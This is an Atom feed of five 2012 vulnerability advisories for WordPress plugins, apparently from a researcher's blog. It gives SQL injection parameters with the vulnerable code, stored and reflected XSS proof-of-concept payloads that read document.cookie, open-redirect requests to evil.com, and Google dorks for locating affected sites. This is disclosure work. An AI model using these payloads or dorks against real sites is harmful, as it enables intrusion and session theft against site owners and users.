<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Tonic Vermifuge</title><link href="http://brindi.si/g/" rel="alternate"></link><link href="http://brindi.si/g/feeds/advisories.atom.xml" rel="self"></link><id>http://brindi.si/g/</id><updated>2012-01-21T00:00:00+01:00</updated><entry><title>WordPress Mingle Forum &lt;= 1.0.32.1 Multiple Vulnerabilities</title><link href="http://brindi.si/g/advisories/wordpress-mingle-forum-10321-multiple-vulnerabilities.html" rel="alternate"></link><updated>2012-01-21T00:00:00+01:00</updated><author><name>Gianluca Brindisi</name></author><id>tag:brindi.si,2012-01-21:g/advisories/wordpress-mingle-forum-10321-multiple-vulnerabilities.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;# Exploit Title: Wordpress Mingle Forum plugin &amp;lt;= 1.0.32.1 Multiple Vulnerabilities
# Date: 2012/01/18  
# Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
# Software Link: http://downloads.wordpress.org/plugin/mingle-forum.1.0.32.1.zip
# Version: 1.0.32.1

You need an authenticated session to exploit the following vulnerabilities.

2)  SQL Injection:
    POST: admin.php?page=mfgroups&amp;amp;mingleforum_Action=usergroups
          delete_usergroups: Delete
          dele_usrgrp%5B%5D: 1 [SQLI]

    Vulnerable code:

    function delete_usergroups(){
            if (isset($_POST[&amp;#39;delete_usergroups&amp;#39;])){
                global $wpdb, $table_prefix;
                $delete_usrgrp = $_POST[&amp;#39;delete_usrgrp&amp;#39;];
                $groups = &amp;quot;&amp;quot;;
                $count = count($delete_usrgrp);
                for($i = 0; $i &amp;lt; $count; $i++){
                    $wpdb-&amp;gt;query(&amp;quot;DELETE FROM &amp;quot;.$table_prefix.&amp;quot;forum_usergroups WHERE id = {$delete_usrgrp[$i]}&amp;quot;);
                    $wpdb-&amp;gt;query(&amp;quot;DELETE FROM &amp;quot;.$table_prefix.&amp;quot;forum_usergroup2user WHERE `group` = {$delete_usrgrp[$i]}&amp;quot;);
                }
                return true;
            }
            return false;

2)  SQL Injection:
    POST: admin.php?page=mfgroups&amp;amp;mingleforum_action=usergroups&amp;amp;do=add_user_togroup            togroupusers: users
          usergroup:    bar [SQLI]
          add_user_togroup: Add+users

    Vulnerable code:

    $group =  $_POST[&amp;#39;usergroup&amp;#39;];
    ---
    $msg = __(&amp;quot;User&amp;quot;, &amp;quot;mingleforum&amp;quot;).&amp;quot; \&amp;quot;$user\&amp;quot; &amp;quot;.__(&amp;quot;added successfully&amp;quot;, &amp;quot;mingleforum&amp;quot;).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
    $sql = &amp;quot;INSERT INTO &amp;quot;.$table_prefix.&amp;quot;forum_usergroup2user (user_id, `group`) VALUES(&amp;#39;$id&amp;#39;, &amp;#39;$group&amp;#39;)&amp;quot;;
    $wpdb-&amp;gt;query($sql);
    ++$added;

2) Stored XSS:
   admin.php?page=mingle-forum

   Some options are not escaped so you can inject a payload in the admin interface.
   Notice that every option is passed trough update_option() before being saved in 
   the db so no sqli here

   Vulnerable code:

   &amp;#39;forum_posts_per_page&amp;#39;           =&amp;gt; $wpdb-&amp;gt;escape($_POST[&amp;#39;forum_posts_per_page&amp;#39;]),
   &amp;#39;forum_threads_per_page&amp;#39;         =&amp;gt; $wpdb-&amp;gt;escape($_POST[&amp;#39;forum_threads_per_page&amp;#39;]),
   &amp;#39;forum_require_registration&amp;#39;     =&amp;gt; $_POST[&amp;#39;forum_require_registration&amp;#39;],
   &amp;#39;forum_show_login_form&amp;#39;          =&amp;gt; $_POST[&amp;#39;forum_show_login_form&amp;#39;],
   &amp;#39;forum_date_format&amp;#39;          =&amp;gt; $wpdb-&amp;gt;escape($_POST[&amp;#39;forum_date_format&amp;#39;]),
   &amp;#39;forum_use_gravatar&amp;#39;             =&amp;gt; $_POST[&amp;#39;forum_use_gravatar&amp;#39;],
   &amp;#39;forum_show_bio&amp;#39;             =&amp;gt; $_POST[&amp;#39;forum_show_bio&amp;#39;],
   &amp;#39;forum_skin&amp;#39;                 =&amp;gt; $op[&amp;#39;forum_skin&amp;#39;],
   &amp;#39;forum_use_rss&amp;#39;              =&amp;gt; $_POST[&amp;#39;forum_use_rss&amp;#39;],
   &amp;#39;forum_use_seo_friendly_urls&amp;#39;    =&amp;gt; $_POST[&amp;#39;forum_use_seo_friendly_urls&amp;#39;],
   &amp;#39;forum_allow_image_uploads&amp;#39;      =&amp;gt; $_POST[&amp;#39;forum_allow_image_uploads&amp;#39;],
   &amp;#39;notify_admin_on_new_posts&amp;#39;      =&amp;gt; $_POST[&amp;#39;notify_admin_on_new_posts&amp;#39;],
   &amp;#39;set_sort&amp;#39;                       =&amp;gt; $op[&amp;#39;set_sort&amp;#39;],
   &amp;#39;forum_use_spam&amp;#39;                 =&amp;gt; $_POST[&amp;#39;forum_use_spam&amp;#39;],
   &amp;#39;forum_use_bbcode&amp;#39;               =&amp;gt; $_POST[&amp;#39;forum_use_bbcode&amp;#39;],
   &amp;#39;forum_captcha&amp;#39;              =&amp;gt; $_POST[&amp;#39;forum_captcha&amp;#39;],
   &amp;#39;hot_topic&amp;#39;                  =&amp;gt; $_POST[&amp;#39;hot_topic&amp;#39;],
   &amp;#39;veryhot_topic&amp;#39;              =&amp;gt; $_POST[&amp;#39;veryhot_topic&amp;#39;],
   &amp;#39;forum_display_name&amp;#39;         =&amp;gt; $_POST[&amp;#39;forum_display_name&amp;#39;],
   &amp;#39;level_one&amp;#39;                  =&amp;gt; $_POST[&amp;#39;level_one&amp;#39;],
   &amp;#39;level_two&amp;#39;                      =&amp;gt; $_POST[&amp;#39;level_two&amp;#39;],
   &amp;#39;level_three&amp;#39;                    =&amp;gt; $_POST[&amp;#39;level_three&amp;#39;],
   &amp;#39;level_newb_name&amp;#39;                =&amp;gt; $_POST[&amp;#39;level_newb_name&amp;#39;],
   &amp;#39;level_one_name&amp;#39;             =&amp;gt; $_POST[&amp;#39;level_one_name&amp;#39;],
   &amp;#39;level_two_name&amp;#39;                 =&amp;gt; $_POST[&amp;#39;level_two_name&amp;#39;],
   &amp;#39;level_three_name&amp;#39;               =&amp;gt; $_POST[&amp;#39;level_three_name&amp;#39;],
   &amp;#39;forum_db_version&amp;#39;               =&amp;gt; $op[&amp;#39;forum_db_version&amp;#39;],
   &amp;#39;forum_disabled_cats&amp;#39;            =&amp;gt; explode(&amp;quot;,&amp;quot;,$_POST[&amp;#39;forum_disabled_cats&amp;#39;])

3) Stored XSS and SQLI:
   admin.php?page=mfstructure

   Adding a new forum both name and description fields are not sanitized so 
   stored xss payload in admin interface AND forum pages is possible.
   They are escaped only for sqli except for add_forum_group_id which is exploitable

   Vulnerable code:

   $add_forum_description = $wpdb-&amp;gt;escape($_POST[&amp;#39;add_forum_description&amp;#39;]);
   $add_forum_name = $wpdb-&amp;gt;escape($_POST[&amp;#39;add_forum_name&amp;#39;]);
   $add_forum_group_id = $_POST[&amp;#39;add_forum_group_id&amp;#39;];
   ---
   $wpdb-&amp;gt;query(&amp;quot;INSERT INTO &amp;quot;.$table_prefix.&amp;quot;forum_forums (name, description, parent_id, sort) 
                VALUES(&amp;#39;$add_forum_name&amp;#39;, &amp;#39;$add_forum_description&amp;#39;, &amp;#39;$add_forum_group_id&amp;#39;, &amp;#39;$max&amp;#39;)&amp;quot;);

4) Stored XSS:
   admin.php?page=mfads

   Every textarea input is not sanitized and can lead to stored xss payloads in admin interface
   and forums pages (this is somehow intended behavior since HTML is allowed but still...)
   i.e: &amp;quot;&amp;gt;&amp;lt;/textarea&amp;gt;[XSS]

   Vulnerable code:

   &amp;#39;mf_ad_above_forum_on&amp;#39;           =&amp;gt; $_POST[&amp;#39;mf_ad_above_forum_on&amp;#39;],
   &amp;#39;mf_ad_above_forum&amp;#39;              =&amp;gt; $_POST[&amp;#39;mf_ad_above_forum_text&amp;#39;],
   &amp;#39;mf_ad_below_forum_on&amp;#39;           =&amp;gt; $_POST[&amp;#39;mf_ad_below_forum_on&amp;#39;],
   &amp;#39;mf_ad_below_forum&amp;#39;              =&amp;gt; $_POST[&amp;#39;mf_ad_below_forum_text&amp;#39;],
   &amp;#39;mf_ad_above_branding_on&amp;#39;        =&amp;gt; $_POST[&amp;#39;mf_ad_above_branding_on&amp;#39;],
   &amp;#39;mf_ad_above_branding&amp;#39;           =&amp;gt; $_POST[&amp;#39;mf_ad_above_branding_text&amp;#39;],
   &amp;#39;mf_ad_above_info_center_on&amp;#39; =&amp;gt; $_POST[&amp;#39;mf_ad_above_info_center_on&amp;#39;],
   &amp;#39;mf_ad_above_info_center&amp;#39;        =&amp;gt; $_POST[&amp;#39;mf_ad_above_info_center_text&amp;#39;],
   &amp;#39;mf_ad_above_quick_reply_on&amp;#39; =&amp;gt; $_POST[&amp;#39;mf_ad_above_quick_reply_on&amp;#39;],
   &amp;#39;mf_ad_above_quick_reply&amp;#39;        =&amp;gt; $_POST[&amp;#39;mf_ad_above_quick_reply_text&amp;#39;],
   &amp;#39;mf_ad_above_breadcrumbs_on&amp;#39; =&amp;gt; $_POST[&amp;#39;mf_ad_above_breadcrumbs_on&amp;#39;],
   &amp;#39;mf_ad_above_breadcrumbs&amp;#39;        =&amp;gt; $_POST[&amp;#39;mf_ad_above_breadcrumbs_text&amp;#39;],
   &amp;#39;mf_ad_below_first_post_on&amp;#39;      =&amp;gt; $_POST[&amp;#39;mf_ad_below_first_post_on&amp;#39;],
   &amp;#39;mf_ad_below_first_post&amp;#39;     =&amp;gt; $_POST[&amp;#39;mf_ad_below_first_post_text&amp;#39;],
   &amp;#39;mf_ad_custom_css&amp;#39;               =&amp;gt; $_POST[&amp;#39;mf_ad_custom_css&amp;#39;]
&lt;/pre&gt;&lt;/div&gt;</summary></entry><entry><title>WordPress Shortcode Redirect &lt;= 1.0.01 Stored XSS</title><link href="http://brindi.si/g/advisories/wordpress-shortcode-redirect-1001-stored-xss.html" rel="alternate"></link><updated>2012-01-21T00:00:00+01:00</updated><author><name>Gianluca Brindisi</name></author><id>tag:brindi.si,2012-01-21:g/advisories/wordpress-shortcode-redirect-1001-stored-xss.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;# Exploit Title: Wordpress Shortcode Redirect plugin &amp;lt;= 1.0.01 Stored XSS
# Dork: inurl:/wp-content/plugins/shortcode-redirect/
# Date: 2012/01/18 
# Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
# Software Link: http://downloads.wordpress.org/plugin/shortcode-redirect.1.0.01.zip
# Version: 1.0.01

1)  You need permissions to write a post (HTML mode) to exploit the shortcode:

    [redirect url=&amp;#39;http://wherever.com&amp;quot;[XSS]&amp;#39; sec=&amp;#39;500&amp;quot;[XSS]&amp;#39;]
&lt;/pre&gt;&lt;/div&gt;</summary></entry><entry><title>Wordpress uCan Post &lt;= 1.0.09 Stored XSS</title><link href="http://brindi.si/g/advisories/wordpress-ucan-post-1009-stored-xss.html" rel="alternate"></link><updated>2012-01-19T00:00:00+01:00</updated><author><name>Gianluca Brindisi</name></author><id>tag:brindi.si,2012-01-19:g/advisories/wordpress-ucan-post-1009-stored-xss.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;# Exploit Title: Wordpress uCan Post plugin &amp;lt;= 1.0.09 Stored XSS
# Dork: inurl:/wp-content/plugins/ucan-post/
# Date: 2012/01/18
# Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
# Software Link: http://downloads.wordpress.org/plugin/ucan-post.1.0.09.zip
# Version: 1.0.09
1)  You need permissions to publish a post from the public interface:
    The submission form is not well sanitized and will result in stored xss
    in admin pages:
    * Name field is not sanitized and it&amp;#39;s injectable with a payload
      which will be stored in the pending submission page in admin panel
      POC: myname&amp;#39;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;window.alert(document.cookie)&amp;lt;/script&amp;gt;
    * Email field is not sanitized but can it will check for a valid email address
      so the maximum result will be a reflected xss
      POC: my@mail.com&amp;#39;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;window.alert(document.cookie)&amp;lt;/script&amp;gt;
    * Post Title is not sanitized and it&amp;#39;s injectable with a payload
      which will be stored in the pending submissions page in admin panel
      POC: title&amp;#39;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;window.alert(document.cookie)&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;</summary></entry><entry><title>Wordpress Age Verification &lt;= 0.4 Open Redirect</title><link href="http://brindi.si/g/advisories/wordpress-age-verification-04-open-redirect.html" rel="alternate"></link><updated>2012-01-10T00:00:00+01:00</updated><author><name>Gianluca Brindisi</name></author><id>tag:brindi.si,2012-01-10:g/advisories/wordpress-age-verification-04-open-redirect.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;# Exploit Title: Wordpress Age Verification plugin &amp;lt;= 0.4 Open Redirect
# Date: 2012/01/10
# Dork: inurl:wp-content/plugins/age-verification/age-verification.php
# Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
# Software Link: http://downloads.wordpress.org/plugin/age-verification.zip
# Version: 0.4
1)  Via GET: http://server/wp-content/plugins/age-verification/age-verification.php?redirect_to=http%3A%2F%2Fwww.evil.com
    The rendered page will provide a link to http://www.evil.com
2)  Via POST: http://server/wp-content/plugins/age-verification/age-verification.php
    redirect_to:    http://www.evil.com
    age_day:        1
    age_month:      1
    age_year:       1970
    Direct redirect to http://www.evil.com
&lt;/pre&gt;&lt;/div&gt;</summary></entry><entry><title>Wordpress Pay With Tweet &lt;= 1.1 Multiple Vulnerabilities</title><link href="http://brindi.si/g/advisories/wordpress-pay-with-tweet-11-multiple-vulnerabilities.html" rel="alternate"></link><updated>2012-01-06T00:00:00+01:00</updated><author><name>Gianluca Brindisi</name></author><id>tag:brindi.si,2012-01-06:g/advisories/wordpress-pay-with-tweet-11-multiple-vulnerabilities.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;# Exploit Title: Wordpress Pay With Tweet plugin &amp;lt;= 1.1 Multiple Vulnerabilities
# Date: 01/06/2012
# Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
# Software Link: http://downloads.wordpress.org/plugin/pay-with-tweet.1.1.zip
# Version: 1.1
1)  Blind SQL Injection in shortcode:
    Short code parameter &amp;#39;id&amp;#39; is prone to blind sqli,
    you need to be able to write a post/page to exploit this:
    [paywithtweet id=&amp;quot;1&amp;#39; AND 1=2&amp;quot;]
    [paywithtweet id=&amp;quot;1&amp;#39; AND 1=1&amp;quot;]
2)  Multiple XSS in pay.php
    http://target.com/wp-content/plugins/pay-with-tweet.php/pay.php
    After connecting to twitter:
        ?link=&amp;amp;22&amp;gt;&amp;lt;/input&amp;gt;[XSS]
    After submitting the tweet:
    ?title=[XSS]&amp;amp;dl=[REDIRECT-TO-URL]%27)&amp;quot;&amp;gt;[XSS]
    The final download link will be replaced with [REDIRECT-TO-URL]
    POC: pay.php?link=%22&amp;gt;&amp;lt;/input&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;amp;title=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;amp;dl=http://brindi.si%27&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;</summary></entry></feed>